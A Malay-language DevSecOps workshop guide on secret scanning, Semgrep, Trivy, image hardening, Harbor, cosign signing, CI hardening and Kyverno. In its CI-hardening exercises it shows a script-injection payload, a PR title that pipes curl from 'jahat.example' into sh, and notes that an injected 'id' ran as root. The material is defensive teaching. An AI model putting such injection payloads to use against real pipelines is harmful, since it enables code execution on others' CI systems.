Jangan commit fail alat.sh, gitleaks-lab.toml dan hasil imbasan jika anda tidak mahu; git add aspnet-app laravel-app (hanya folder app) ialah pilihan yang lebih sempit. Perubahan ini penting: Modul 2 dan seterusnya bermula daripada keadaan ini.

Langkah 2: sejarah masih bocor

terminal
gitleaks git . --no-banner -l error; echo "exit=$?"

Sejarah masih ada 15 temuan (exit=1), kerana commit lama tidak berubah. Anda tidak boleh menyelesaikannya dengan commit baharu.

Langkah 3: baseline

Selepas secret lama diputar, anda mahu pipeline hanya gagal untuk secret baharu. Jana baseline daripada keadaan semasa:

terminal
gitleaks git . --no-banner -f json -r gitleaks-baseline.json -l error
gitleaks git . --no-banner --baseline-path gitleaks-baseline.json -l error; echo "exit=$?"

Pada langkah kedua exit=0: temuan dalam baseline diabaikan. Tambah secret baharu dan commit, kemudian jalankan semula arahan kedua: exit=1.

terminal
echo 'api_key = "Zq8w3kLm2Pv9Xb7Nc4Rt6Yh1"' > aspnet-app/baru.txt
git add aspnet-app/baru.txt && git commit --no-verify -qm "uji secret baharu"
gitleaks git . --no-banner --baseline-path gitleaks-baseline.json -l error; echo "exit=$?"
terminal
echo 'api_key = "Zq8w3kLm2Pv9Xb7Nc4Rt6Yh1"' > laravel-app/baru.txt
git add laravel-app/baru.txt && git commit --no-verify -qm "uji secret baharu"
gitleaks git . --no-banner --baseline-path gitleaks-baseline.json -l error; echo "exit=$?"

--no-verify melangkau hook pre-commit supaya anda dapat menguji imbasan sejarah. Buang commit ujian itu: git reset --hard HEAD~1 (selamat kerana perubahan Langkah 1 sudah di-commit).

Urutan apabila secret bocor

  1. Putar (revoke dan cipta baharu) secret itu. Ini langkah yang paling penting dan paling pantas.
  2. Semak log pembekal untuk penggunaan luar biasa sejak secret itu terbocor.
  3. Keluarkan daripada kod dan sumber (seperti Langkah 1).
  4. Bersihkan sejarah hanya jika perlu (git filter-repo), dengan faham bahawa klon dan fork lama masih mempunyainya. Ini langkah kosmetik, bukan penyelesaian.
  5. Tambah kawalan: pre-commit, imbasan CI, baseline.

Secrets management

Mengeluarkan secret daripada kod belum cukup; ia perlu disimpan dan diedarkan dengan selamat.

Pendekatan Sesuai untuk Catatan
Pemboleh ubah persekitaran App kontena mudah Mudah, tetapi kelihatan dalam docker inspect dan proses; jangan log
dotnet user-secrets, .env (git-ignored) Pembangunan tempatan Jangan guna di produksi
Secret store awan (Azure Key Vault, AWS Secrets Manager) Produksi awan Akses melalui identiti app, bukan kunci statik
Kubernetes Secret Kluster Hanya base64, bukan penyulitan; hadkan RBAC dan sulitkan etcd
Sealed Secrets / SOPS GitOps Secret disulitkan dalam git; hanya kluster/kunci anda boleh menyahsulit
OIDC (identiti persekutuan) CI/CD Tiada secret jangka panjang; CI menukar token sementara

Peraturan ringkas: jangan hantar secret, hantar identiti. Bila boleh, gantikan kunci statik dengan identiti yang dikeluarkan secara sementara.

Teori ringkas

Apa itu SAST

SAST (Static Application Security Testing) membaca kod sumber tanpa menjalankannya dan mencari corak yang tidak selamat. Ia pantas, boleh dijalankan pada setiap commit, dan menunjuk kepada baris kod sebenar.

Teknik Cara Contoh
Padanan corak Cari bentuk kod tertentu "SELECT ... " + input
Taint analysis Jejak data daripada sumber (input pengguna) ke sink (SQL, shell) $_GET['id'] sampai ke $db->query(...)
Analisis aliran data lebih dalam Merentas fail dan fungsi Biasanya dalam edisi komersial

Apa SAST tidak boleh lakukan

  • Ia tidak melihat app yang berjalan: konfigurasi, header, cara pelayan menjawab.
  • Ia lemah pada logik perniagaan: cookie yang boleh dipalsukan, IDOR, kebenaran yang tiada.
  • Hasilnya ada positif palsu (amaran yang bukan masalah) dan negatif palsu (masalah sebenar yang tidak dilihat).
  • Hasilnya bergantung pada peraturan yang anda muatkan, dan pada bentuk kod.

Dalam makmal ini anda akan melihat ketiga-tiganya dengan data sebenar.

Semgrep

Semgrep menulis peraturan dalam bentuk yang kelihatan seperti kod itu sendiri, dan mempunyai pustaka peraturan komuniti (p/default, p/owasp-top-ten, p/gitlab dan lain-lain). Ia menyokong C#, PHP dan banyak bahasa lain dalam satu alat. Untuk .NET dan Laravel, alat khusus bahasa wujud sebagai pelengkap: penganalisis Roslyn (Microsoft.CodeAnalysis.NetAnalyzers, Security Code Scan) dan PHPStan/Larastan. Bengkel ini menumpu pada Semgrep supaya kedua-dua trek mempunyai alat yang sama.

Makmal 2.7: Quality gate dan pengurusan temuan

Tujuan. Menjadikan imbasan sebagai pintu dalam pipeline, dan mengurus temuan yang diterima.

Pintu berasaskan exit code. Semgrep memulangkan 0 walaupun ada temuan, kecuali anda minta ia gagal:

terminal
semgrep scan --quiet --config p/default --config p/gitlab --severity ERROR --error aspnet-app > /dev/null; echo "exit=$?"
terminal
semgrep scan --quiet --config p/default --config p/phpcs-security-audit --severity ERROR --error laravel-app > /dev/null; echo "exit=$?"

exit=1 bermakna ada temuan keterukan ERROR. Di CI, ini yang menggagalkan job. --severity ERROR menjadikan WARNING tidak menggagalkan, jadi pasukan boleh mula dengan pintu yang longgar dan ketatkan kemudian.

SARIF. Format piawai untuk memaparkan temuan dalam GitHub Code Scanning:

terminal
semgrep scan --quiet --config p/default --sarif -o hasil.sarif .

Menerima temuan dengan alasan. Jika temuan itu positif palsu atau diterima, tandakan dengan komen nosemgrep di baris sebelumnya, dengan nama peraturan dan alasan:

csharp
// nosemgrep: gitlab.security_code_scan.SCS0002-1 -- SQL benih data tetap, tiada input pengguna
using var cmd = new SqliteCommand(sql, conn);

Letakkan komen itu di atas baris using var cmd = new SqliteCommand(sql, conn); dalam Db.Exec, kemudian imbas semula: positif palsu itu hilang daripada hasil.

// nosemgrep: php.lang.security.exec-use.exec-use -- hos disahkan dengan regex dan escapeshellarg
$output = shell_exec('ping -c 1 ' . escapeshellarg($host) . ' 2>&1');

Letakkan komen sebelum baris yang berkenaan, kemudian imbas semula.

Peraturan: setiap pengecualian perlu ada alasan dan, dalam projek sebenar, tarikh semakan semula. Pengecualian tanpa alasan ialah hutang keselamatan yang tersembunyi.

Teori ringkas

Apa itu SCA

Kebanyakan kod dalam app anda bukan anda yang tulis. SCA membaca senarai pakej yang anda guna dan memadankannya dengan pangkalan data kerentanan yang diketahui (CVE, GitHub Advisory dan lain-lain). Ia menjawab: "pakej versi ini ada masalah yang diketahui?"

  • Langsung (direct): pakej yang anda tambah sendiri dalam .csproj atau composer.json.
  • Transitif: pakej yang dibawa oleh pakej lain. Anda tidak memilihnya tetapi anda tetap menjalankannya.
  • Fail kunci (lock file) merekod versi tepat yang digunakan: packages.lock.json (.NET), composer.lock (PHP). Alat SCA membaca fail ini kerana ia menyatakan apa yang sebenarnya dipasang, bukan julat yang dibenarkan.

Apa SCA tidak boleh lakukan

  • Ia memberitahu pakej ada kerentanan, bukan sama ada kod anda menggunakan bahagian yang rentan.
  • Kerentanan yang baru ditemui tidak akan ada hingga pangkalan data dikemas kini. Imbas berkala, bukan sekali.
  • Keterukan (High) ialah skor umum, bukan kesan sebenar pada app anda. Konteks anda menentukan keutamaan.

SBOM

SBOM (Software Bill of Materials) ialah senarai komponen dalam perisian anda, seperti senarai bahan pada bungkusan. Dua format piawai: CycloneDX dan SPDX. Gunanya: apabila kerentanan baharu diumumkan (seperti Log4Shell), anda boleh menyoal SBOM yang disimpan untuk tahu serta-merta app mana terjejas, tanpa mengimbas semula semua.

VEX ialah pasangan SBOM: dokumen yang menyatakan sama ada sesuatu kerentanan benar-benar boleh dieksploit dalam produk anda (not_affected, affected, fixed). Ia mengurangkan bunyi.

Pakej yang direka oleh AI

Model bahasa kadang-kadang mencadangkan nama pakej yang tidak wujud. Penyerang boleh mendaftarkan nama itu di registry awam dengan kod berniat jahat, dan sesiapa yang menyalin cadangan AI akan memasangnya. Ini dipanggil slopsquatting. Ia berkait dengan typosquatting (nama hampir sama dengan pakej popular) dan dependency confusion (nama pakej dalaman didaftarkan di registry awam).

Kawalan asas: semak pakej wujud, semak umur, jumlah unduh dan pemilik, guna fail kunci, dan gunakan suapan peribadi untuk pakej dalaman.

Makmal 3.4: Bila tiada versi yang dibaiki

Tujuan. Membuat keputusan dengan sedar bila anda tidak boleh membaiki, dan menjadikan imbasan sebagai pintu.

Baki CVE-2025-6965 (SQLitePCLRaw.lib.e_sqlite3) tiada versi dibaiki. Pilihan anda: tunggu pembaikan, ganti pakej, atau terima risiko dengan alasan. Rekod penerimaan dalam fail .trivyignore dengan tarikh luput:

terminal
echo "CVE-2025-6965 exp:2027-01-31" > .trivyignore
trivy fs --scanners vuln aspnet-app

Anda akan melihat Clean. Tarikh luput memaksa semakan semula: selepas itu temuan muncul semula.

Semua kerentanan sudah dibaiki. Untuk melihat cara terima risiko, andaikan anda mahu mengabaikan CVE-2021-34551 buat sementara (anda tidak perlu benar-benar melakukannya):

terminal
git stash          # simpan pembaikan anda
trivy fs --scanners vuln laravel-app | grep -c CVE
echo "CVE-2021-34551 exp:2027-01-31" > .trivyignore
trivy fs --scanners vuln laravel-app | grep -c CVE
rm .trivyignore
git stash pop

Bilangan CVE turun satu apabila dimasukkan dalam .trivyignore.

Pintu CI. Untuk menggagalkan pipeline bila ada kerentanan serius:

terminal
trivy fs --scanners vuln --severity HIGH,CRITICAL --exit-code 1 aspnet-app; echo "exit=$?"
rm -f .trivyignore
trivy fs --scanners vuln --severity HIGH,CRITICAL --exit-code 1 aspnet-app >/dev/null; echo "tanpa pengecualian exit=$?"
terminal
trivy fs --scanners vuln --severity HIGH,CRITICAL --exit-code 1 laravel-app; echo "exit=$?"

--exit-code 1 menjadikan Trivy memulangkan 1 bila ada temuan, yang menggagalkan job CI. Tanpa pengecualian .trivyignore, Trek A memberi exit=1 kerana e_sqlite3 kekal.

Pilihan --ignore-unfixed menyembunyikan kerentanan tanpa versi dibaiki. Ia mengurangkan bunyi tetapi juga menyembunyikan risiko sebenar. Guna dengan sedar, dan rekodkan keputusan, bukan sekadar menghidupkan bendera.

#!/usr/bin/env bash
# Semak sama ada pakej wujud di registry awam dan lihat metadata asas (umur, muat turun).
# Berguna sebelum menambah pakej yang dicadangkan oleh asisten AI atau artikel yang anda tidak kenal.
#
# Guna:
#   ./semak-pakej.sh nuget Newtonsoft.Json
#   ./semak-pakej.sh packagist phpmailer/phpmailer
# Perlu: curl dan python3.
set -uo pipefail

eko="${1:-}"; nama="${2:-}"
[ -n "$eko" ] && [ -n "$nama" ] || { echo "Guna: $0 nuget|packagist NAMA"; exit 2; }
tmp="$(mktemp)"; trap 'rm -f "$tmp"' EXIT

case "$eko" in
  nuget)
    id="$(echo "$nama" | tr 'A-Z' 'a-z')"
    kod="$(curl -s -o "$tmp" -w '%{http_code}' "https://api.nuget.org/v3-flatcontainer/$id/index.json")"
    if [ "$kod" != "200" ]; then echo "TIDAK WUJUD di NuGet: $nama (HTTP $kod). Mungkin direka oleh AI."; exit 1; fi
    python3 - "$tmp" "$nama" <<'EOF'
import json, sys, urllib.request
v = json.load(open(sys.argv[1]))["versions"]
q = f"https://azuresearch-usnc.nuget.org/query?q=packageid:{sys.argv[2]}&take=1&prerelease=true"
d = json.load(urllib.request.urlopen(q))["data"]
m = d[0] if d else {}
print(f"WUJUD di NuGet: {sys.argv[2]}")
stabil = [x for x in v if "-" not in x]
print(f"  versi        : {len(v)} (stabil terkini {stabil[-1] if stabil else v[-1]})")
print(f"  jumlah unduh : {m.get('totalDownloads', 'tidak diketahui')}")
print(f"  pemilik      : {', '.join(m.get('owners', [])) or 'tidak diketahui'}")
print(f"  disahkan     : {m.get('verified', 'tidak diketahui')} (awalan ID dipegang oleh pemilik yang disahkan)")
EOF
    ;;
  packagist)
    kod="$(curl -s -o "$tmp" -w '%{http_code}' "https://packagist.org/packages/$nama.json")"
    if [ "$kod" != "200" ]; then echo "TIDAK WUJUD di Packagist: $nama (HTTP $kod). Mungkin direka oleh AI."; exit 1; fi
    python3 - "$tmp" <<'EOF'
import json, sys
p = json.load(open(sys.argv[1]))["package"]
print(f"WUJUD di Packagist: {p['name']}")
print(f"  keterangan   : {p.get('description', '')[:80]}")
print(f"  dicipta      : {p.get('time', 'tidak diketahui')[:10]}")
print(f"  jumlah unduh : {p.get('downloads', {}).get('total', 'tidak diketahui')}")
print(f"  bintang      : {p.get('favers', 'tidak diketahui')}")
print(f"  versi        : {len(p.get('versions', {}))}")
print(f"  ditinggalkan : {p.get('abandoned') or 'tidak'}")
EOF
    ;;
  *) echo "Ekosistem tidak disokong: $eko (guna nuget atau packagist)"; exit 2 ;;

Teori ringkas

Dari mana kerentanan dalam imej datang

Satu imej ialah timbunan lapisan. Setiap lapisan membawa pakej:

  1. Imej asas (Ubuntu, Debian, Alpine): pakej OS seperti apt, libc, openssl.
  2. Runtime (.NET, PHP): perpustakaan runtime itu sendiri.
  3. Pakej app: dependency anda (SCA, Modul 3).
  4. Apa yang anda tambah: alat binaan, curl, git, composer.

Setiap pakej yang tidak perlu semasa app berjalan hanya menambah permukaan serangan dan bunyi dalam imbasan.

Amalan imej yang lebih selamat

Amalan Kenapa
Multi-stage build Alat binaan (SDK, composer, git) kekal dalam peringkat binaan, bukan imej akhir
Imej asas yang kecil dan sesuai (aspnet bukan sdk; Alpine) Lebih sedikit pakej, lebih sedikit kerentanan
Bukan root (USER) Jika app dieksploit, penyerang tidak mendapat root dalam kontena
Tiada secret dalam imej Imej disimpan dan dikongsi; secret dalam lapisan kekal selamanya
HEALTHCHECK Orkestra tahu bila app tidak sihat
Kemas kini pakej OS semasa binaan Menutup kerentanan yang sudah ada pembaikan
Kunci versi imej asas (tag tepat atau digest) Binaan boleh diulang; tiada perubahan senyap

Harbor

Harbor ialah registry kontena sumber terbuka. Ciri yang kita guna:

  • Imbasan automatik (Trivy terbina dalam) pada setiap push.
  • Polisi pencegahan: sekat pull imej yang mempunyai kerentanan pada atau melebihi ambang yang ditetapkan.
  • Allowlist CVE: kecualikan CVE tertentu dengan tarikh luput.
  • Robot account: kelayakan khusus untuk CI, dengan kebenaran terhad pada satu projek.
  • Kuota dan kawalan akses mengikut projek.

Perhatian penting. Docker versi baharu menambah attestation (provenance dan SBOM) pada imej yang dibina, lalu imej ditolak sebagai OCI index dengan beberapa rujukan. Dalam ujian di server lab ini, polisi pencegahan Harbor tidak berkuat kuasa bagi imej index tersebut: docker pull berjaya walaupun ambang ditetapkan serendah Low, manakala imej yang sama dibina dengan --provenance=false --sbom=false ditolak dengan HTTP 412. Sebab itu semua arahan binaan dalam bengkel ini menggunakan bendera tersebut. Pengajarannya lebih luas: sahkan bahawa kawalan anda benar-benar menyekat, jangan hanya percaya ia dihidupkan.

Teori ringkas

DAST dan SAST

DAST (Dynamic Application Security Testing) menyerang app yang sedang berjalan dari luar seperti penyerang, tanpa melihat kod. Ia menemui masalah yang SAST tidak nampak: konfigurasi runtime (header, CORS), kelemahan yang bergantung pada cara pelayan sebenarnya menjawab, dan bukti bahawa sesuatu boleh dieksploit.

SAST DAST
Melihat Kod sumber App yang berjalan
Bila Awal, setiap commit Lewat, perlu app berjalan
Menunjuk Baris kod URL dan parameter
Kekuatan Pantas, tepat pada kod Bukti eksploit, konfigurasi runtime
Kelemahan Tidak nampak runtime Hanya nampak apa yang ia jumpa (liputan)

Pasif dan aktif

  • Pasif: ZAP hanya memerhati permintaan dan jawapan biasa, dan menegur apa yang kelihatan (header tiada, cookie tanpa bendera). Selamat dan pantas, tetapi tidak menemui kelemahan yang perlu diserang untuk dilihat.
  • Aktif: ZAP menghantar muatan serangan (cuba suntikan SQL, skrip, laluan ../) dan memerhati reaksi. Ia menemui kelemahan sebenar tetapi lebih perlahan, boleh mengubah data, dan perlu dijalankan pada persekitaran ujian.

Supply chain dan tandatangan

SBOM (Modul 3) menyenaraikan apa yang ada dalam imej. Tandatangan membuktikan siapa yang membinanya dan bahawa ia tidak diubah. Gabungan kedua-duanya menjawab: "adakah imej ini yang kita bina, dan apa yang ada di dalamnya?"

cosign menandatangani imej OCI dan menyimpan tandatangan di registry yang sama. Ada dua cara:

  • Berasaskan kunci (kita guna): anda ada pasangan kunci; kunci peribadi menandatangani, kunci awam mengesahkan. Mudah, tetapi anda mengurus kunci peribadi dengan selamat.
  • Tanpa kunci (keyless): tandatangan menggunakan identiti OIDC (cth GitHub Actions atau GitLab CI) dan log ketelusan awam Sigstore. Tiada kunci jangka panjang untuk dicuri, tetapi memerlukan akses ke perkhidmatan Sigstore dan rekod awam. Sesuai untuk produksi tetapi di luar skop makmal ini.

SLSA ialah rangka kerja yang menilai kematangan supply chain (siapa membina, bagaimana, dengan bukti apa). Apa yang kita bina hari ini ialah langkah awal ke arah itu.

  • imej: bina, imbas imej (gagal jika ada Critical), jana SBOM, tolak ke Harbor, tunggu imbasan Harbor, pasang cosign, tandatangani dan lampirkan SBOM. Berjalan pada push sahaja kerana ia memerlukan secret.

  2. Kenapa tiada action pihak ketiga selain actions/checkout?
  3. Apa gunanya langkah "Tunggu imbasan Harbor selesai"?
Jawapan
  1. Pull request (terutama daripada fork) tidak patut mendapat secret. Job yang memegang secret dan menolak imej hanya berjalan selepas kod digabung ke main.
  2. Setiap action pihak ketiga ialah kod luar yang berjalan dalam pipeline anda. Menggunakan imej Docker dengan versi dikunci (yang sama seperti alat.sh) mengurangkan permukaan itu dan memberi hasil yang sama seperti yang anda uji secara setempat. actions/checkout pula disematkan pada SHA commit bukan tag.
  3. Dengan polisi pencegahan Harbor, imej yang belum selesai diimbas disekat (412). Tanpa menunggu, cosign sign yang mengakses imej itu boleh gagal secara rawak.

Simpan gitlab-ci.yml (bahagian Fail modul) sebagai .gitlab-ci.yml di akar repo, dan tolak:

  • imej: bina, imbas imej (gagal jika ada Critical), jana SBOM, tolak ke Harbor, tunggu imbasan Harbor, ambil cosign, tandatangani dan lampirkan SBOM. Berjalan pada main sahaja, selepas semua job imbas lulus.

  1. Kenapa job imej tidak berjalan pada merge request?
  2. Kenapa kita tidak menggunakan templat siap pakai GitLab (include: template: Security/SAST.gitlab-ci.yml)?

Dengan job biasa, hasil sama seperti yang anda uji secara setempat, kod keluar menjadi pintu, dan ia berfungsi pada semua peringkat.

Ini normal dan sebahagian daripada pelajaran. Baca log dan baiki. Dua sebab biasa:

Semgrep menanda dua temuan ERROR yang tinggal selepas pembaikan: SCS0001 pada Process.Start (kod sudah selamat, tetapi peraturan menanda penggunaannya) dan SCS0002 pada Db.Exec (SQL benih tetap). Terima kedua-duanya dengan alasan seperti dalam Modul 2.7:

// nosemgrep: gitlab.security_code_scan.SCS0001-1 -- hos disahkan dengan regex, hujah dihantar sebagai senarai
using var p = Process.Start(psi)!;
csharp
// nosemgrep: gitlab.security_code_scan.SCS0002-1 -- SQL benih data tetap, tiada input pengguna
using var cmd = new SqliteCommand(sql, conn);

(Letakkan komen di baris sebelum kod yang ditanda, dalam Program.cs.)

Semgrep menanda MD5 (weak-crypto, tiga lokasi) dan exec-use (shell_exec). MD5 untuk kata laluan ialah kelemahan sebenar: jangan tutup dengan nosemgrep. Terapkan tampalan bcrypt yang disediakan (laravel-hash.patch, Fail modul), ia menggantikan MD5 dengan password_hash/password_verify dalam seeder dan log masuk:

terminal
git apply --check laravel-hash.patch && git apply laravel-hash.patch

Tampalan ini mengandaikan tampalan SAST dan DAST (Modul 2 dan 5) sudah diterapkan. Untuk exec-use, kod sudah selamat (escapeshellarg dan regex), jadi terima dengan alasan:

php
// nosemgrep: php.lang.security.exec-use.exec-use -- hos disahkan dengan regex dan escapeshellarg
$output = shell_exec('ping -c 1 ' . escapeshellarg($host) . ' 2>&1');

Trivy boleh gagal kerana pengecualian (.trivyignore) belum dalam repo, atau manifest k8s/ masih asal: pembaikannya ada dalam Modul 7. Pipeline akan lulus sepenuhnya selepas Modul 7.

Harbor dan Trivy CLI boleh berbeza pendapat. Pintu imej kita gagal pada Critical (Trivy CLI), manakala polisi Harbor menyekat capaian pada High (pengimbas Trivy dalam Harbor, versi dan pangkalan data kerentanannya sendiri). Imej yang bersih mengikut CLI boleh disekat oleh Harbor dengan HTTP 412 pada langkah tandatangan. Itu bukan pepijat pipeline: dua alat, dua pangkalan data. Baiki kerentanan yang Harbor tunjuk, atau (untuk kerentanan tanpa pembaikan) gunakan allowlist projek dengan tarikh tamat.

  1. GITHUB_TOKEN berkebenaran minimum.
  2. Action disematkan pada SHA.
  3. persist-credentials: false pada checkout.
  4. Secret dihantar melalui env:, bukan diselit dalam run:.
  5. timeout-minutes pada setiap job.
  6. cosign dimuat turun dengan checksum.

Cari kecacatan. Penyelenggara baharu menambah langkah ini. Apa yang salah?

yaml
- name: Sapa pengarang PR
  run: echo "Terima kasih ${{ github.event.pull_request.title }}"
Jawapan

Barisan 1 hingga 5 hampir di bahagian atas dan dalam setiap job. Kawalan 6 ialah langkah "Pasang cosign" dengan sha256sum -c.

Langkah baharu itu ialah suntikan skrip: ${{ ... }} diganti sebelum shell berjalan, jadi tajuk PR seperti "; curl jahat.example | sh; " akan dijalankan sebagai arahan. Pembaikan: hantar melalui env: dan rujuk sebagai pemboleh ubah shell yang dipetik:

yaml
- name: Sapa pengarang PR
  env:
    TAJUK: ${{ github.event.pull_request.title }}
  run: echo "Terima kasih $TAJUK"

Branch protection. Dalam GitHub: Settings → Branches → Add rule untuk main. Hidupkan: Require a pull request before merging, Require status checks to pass (pilih imbas) dan Require review from Code Owners. Cipta fail .github/CODEOWNERS dengan baris * @NAMA_ANDA.

Selepas ini tiada sesiapa (termasuk anda) boleh menolak terus ke main; semua perubahan melalui PR yang lulus imbas.

Audit. Dalam .gitlab-ci.yml, cari bukti bagi setiap kawalan ini dan tulis nombor barisnya:

  1. Setiap image: menggunakan versi tepat, bukan latest.
  2. default: timeout ditetapkan.
  3. Tiada secret dalam fail; semuanya pembolehubah projek (Masked dan Protected).
  4. workflow: rules menghadkan pipeline kepada merge request dan cawangan lalai.
  5. Job imej (yang memegang secret) hanya pada cawangan lalai.
  6. cosign diambil daripada imej yang dikunci pada digest.

Cari kecacatan. Penyelenggara baharu menambah langkah ini pada pipeline merge request. Apa yang salah?

yaml
sapa:
  script:
    - sh -c "echo Terima kasih $CI_MERGE_REQUEST_TITLE"
Jawapan

Barisan 1 hingga 6 ada di sepanjang fail: versi imej dalam image:, default: timeout, workflow: rules, rules: pada imej, dan COSIGN_IMAGE yang berdigest.

Langkah baharu itu ialah suntikan skrip. Shell luar menggantikan $CI_MERGE_REQUEST_TITLE ke dalam rentetan yang dihantar kepada sh -c, dan shell dalam kemudian mentafsirnya sebagai arahan. Kami menguji ini: merge request bertajuk Betulkan; id menjalankan id dalam job (uid=0(root)), manakala echo "Terima kasih $CI_MERGE_REQUEST_TITLE" (tanpa sh -c) hanya mencetak tajuk itu sebagai teks. Pembaikan: jangan guna sh -c atau eval dengan pembolehubah yang dikawal penyerang; rujuk sebagai "$VAR" yang dipetik terus dalam script.

yaml
sapa:
  script:
    - echo "Terima kasih $CI_MERGE_REQUEST_TITLE"

Secret dilindungi. Kami juga menguji bahawa pembolehubah Protected tidak diberi kepada pipeline merge request daripada cawangan biasa: job yang mencetak ${RAHSIA_UJI:-kosong} mencetak kosong. Itulah sebab HARBOR_PASSWORD dan kunci cosign anda dilindungi.

Soket Docker. Runner makmal memasang /var/run/docker.sock dalam setiap job. Soalan: apa yang boleh dilakukan oleh seorang yang boleh mengubah .gitlab-ci.yml pada runner itu?

Jawapan

Soket Docker memberi akses kepada daemon Docker hos. Sesiapa yang boleh mengubah pipeline boleh menjalankan kontena sebarangan pada hos (termasuk memasang / hos), membaca secret job lain, dan menghentikan atau mengganggu runner. Dalam produksi, gunakan runner tanpa soket dikongsi (cth kaniko/buildah, atau runner berasingan dan sementara untuk job binaan), dan hadkan siapa yang boleh mengubah pipeline pada cawangan dilindungi.

Perlindungan cawangan. Dalam GitLab:

  1. Settings → Repository → Protected branches: untuk main, tetapkan Allowed to push and merge → Maintainers bagi gabung dan No one bagi push. Kami menguji bahawa git push terus ke main kemudian ditolak: You are not allowed to push code to protected branches on this project.
  2. Settings → Merge requests: hidupkan Pipelines must succeed.

Selepas ini semua perubahan ke main melalui merge request, dan merge request itu hanya boleh digabung bila pipeline imbas lulus. Penguatkuasaan CODEOWNERS (kelulusan wajib daripada pemilik kod) ialah ciri GitLab peringkat berbayar (Premium); semak peringkat GitLab anda sebelum bergantung padanya.

Makmal 6.5: Uji pintu

Tujuan. Pastikan pintu benar-benar menggagalkan pipeline.

  1. Cipta cawangan dan tambah secret palsu:
terminal
git switch -c uji-pintu
echo 'api_key = "Zq8w3kLm2Pv9Xb7Nc4Rt6Yh1"' > "$APP_DIR/rahsia.txt"

Gantikan $APP_DIR dengan aspnet-app atau laravel-app. Commit (pre-commit hook Modul 1 akan menyekatnya; guna --no-verify untuk ujian ini), dan tolak cawangan itu. 2. Buka pull request (GitHub) atau merge request (GitLab) ke main. Lihat langkah/job Gitleaks (secret-detection): ia mesti merah. 3. Buang fail itu dalam commit baharu, tolak semula. Adakah ia hijau? Cuba dan perhatikan. 4. Buang commit yang mengandungi secret daripada sejarah cawangan, dan tolak dengan paksa:

terminal
git reset --hard HEAD~2          # buang commit "buang" dan commit "tambah"
git push --force-with-lease

Kini pintu mesti hijau.

Jawapan: kenapa langkah 3 masih merah?

Gitleaks mengimbas sejarah git (gitleaks git), bukan hanya fail semasa. Commit yang menambah secret masih ada dalam sejarah cawangan walaupun commit seterusnya membuang failnya, jadi pintu terus merah. Inilah sebabnya Modul 1 menekankan bahawa secret yang pernah di-commit mesti dianggap bocor dan diputar (rotate), bukan sekadar dibuang. Langkah 4 menulis semula sejarah cawangan ujian ini sahaja; pada cawangan yang dikongsi (atau selepas secret sampai ke main), cara yang betul ialah putar secret, kemudian tambah temuan itu ke baseline dengan alasan.

Nota GitLab. Job secret-detection menggunakan GIT_STRATEGY: clone. Kami mendapati bahawa runner yang menggunakan semula folder kerja menyimpan rujukan lama (refs/pipelines/*) ke commit yang sudah anda buang dengan paksa, dan Gitleaks mengimbas semua rujukan, jadi pintu kekal merah walaupun cawangan anda sudah bersih. Clone baharu setiap kali menghapuskan kesan itu: dalam ujian kami, pintu menjadi hijau selepas langkah 4 hanya dengan tetapan ini. Pada GitHub Actions, runner yang dihoskan bermula bersih setiap kali.

Itu pasti memberi anda bukti bahawa pintu berfungsi: pintu yang tidak pernah diuji ialah andaian, bukan kawalan.

Teori ringkas

Pod Security Standards (PSS)

Kubernetes mempunyai tiga tahap terbina dalam yang dikuatkuasakan oleh API server melalui label namespace:

Tahap Maksud
privileged Tiada sekatan
baseline Menyekat yang jelas berbahaya (privileged, hostNetwork, hostPath)
restricted Amalan terbaik: bukan root, tiada eskalasi, capability dibuang, seccomp

securityContext yang penting

Medan Fungsi
runAsNonRoot: true + runAsUser (UID berangka) Proses bukan root; UID berangka supaya kubelet boleh mengesahkan
allowPrivilegeEscalation: false Proses tidak boleh mendapat keistimewaan lebih
capabilities.drop: [ALL] Buang semua keupayaan Linux
readOnlyRootFilesystem: true Sistem fail akar baca sahaja; tulis hanya ke volum yang dinyatakan
seccompProfile: RuntimeDefault Sekat syscall berbahaya
resources.requests/limits Elak satu pod menghabiskan node
automountServiceAccountToken: false App tidak perlu kelayakan API Kubernetes

NetworkPolicy dan Kyverno

NetworkPolicy mengawal trafik antara pod. Pendekatan selamat: tolak semua, kemudian benarkan yang perlu. Kyverno ialah pengawal admission berasaskan dasar: ia menerima setiap permintaan ke API server dan menolak yang melanggar dasar, termasuk tandatangan imej yang tiada.

Uji dengan imej bertandatangan dan imej tanpa tandatangan (daripada Makmal 6.2). Ganti APP:

terminal
kubectl -n klien create secret docker-registry harbor --docker-server=harbor.lab.test \
  --docker-username=$P --docker-password='KATA_LALUAN'
PULL='{"spec":{"imagePullSecrets":[{"name":"harbor"}]}}'
kubectl -n klien run sah --image=harbor.lab.test/$P/$APP:selamat --restart=Never --overrides="$PULL"
kubectl -n klien run belum-sah --image=harbor.lab.test/$P/$APP:belum-sah --restart=Never --overrides="$PULL"
Jawapan

Pod sah dicipta: Kyverno mengesahkan tandatangan dengan kunci awam anda dan menggantikan tag dengan digest (mutateDigest), jadi pod berjalan dengan imej tepat yang ditandatangani. Pod belum-sah ditolak dengan no signatures found.

Perhatikan satu pengajaran: ini hanya berjaya kerana imej :selamat anda sudah ditandatangani dalam Modul 6 dan kerana Harbor boleh dihubungi daripada Kyverno. Jika imej baharu tidak ditandatangani oleh pipeline, ia tidak akan berjalan di kluster. Itulah niat dasar ini: tiada bukti, tiada jalan.

Dasar Kyverno dalam bengkel ini menggunakan ClusterPolicy, yang kini ditandakan sebagai usang dalam Kyverno 1.19 (amaran dipaparkan semasa apply); ia masih berfungsi dan jenis dasar baharu (ValidatingPolicy, ImageValidatingPolicy) mengganti nanti.

Makmal 7.6: Capstone dan penilaian

Tujuan. Menunjukkan bahawa anda boleh membawa app daripada keadaan asal kepada keadaan yang boleh dipertahankan, dengan bukti.

Tugasan. Untuk app trek anda, tunjukkan setiap kriteria di bawah dengan bukti (arahan dan outputnya, atau tangkapan skrin tab Actions). Anda ada kira-kira 30 minit untuk membaiki apa yang masih tertinggal dan membuat demo ringkas 3 minit kepada instruktur.

# Kriteria Bukti Markah
1 Secret: tiada secret dalam kod semasa; secret lama dalam baseline gitleaks dir <app> bersih; gitleaks git . --baseline-path gitleaks-baseline.json exit 0 10
2 SAST: SQL/command injection dibaiki dan disahkan dengan ujian fungsi; baki Semgrep diterima dengan alasan Imbasan Semgrep tiada ERROR; ujian curl 15
3 SCA: pakej dinaikkan; baki diterima dengan tarikh luput trivy fs --severity HIGH,CRITICAL --exit-code 1 exit 0 10
4 Imej: Dockerfile selamat (multi-stage, bukan root, tiada secret) hadolint/trivy config/Checkov bersih untuk Dockerfile; docker exec ... id bukan root 10
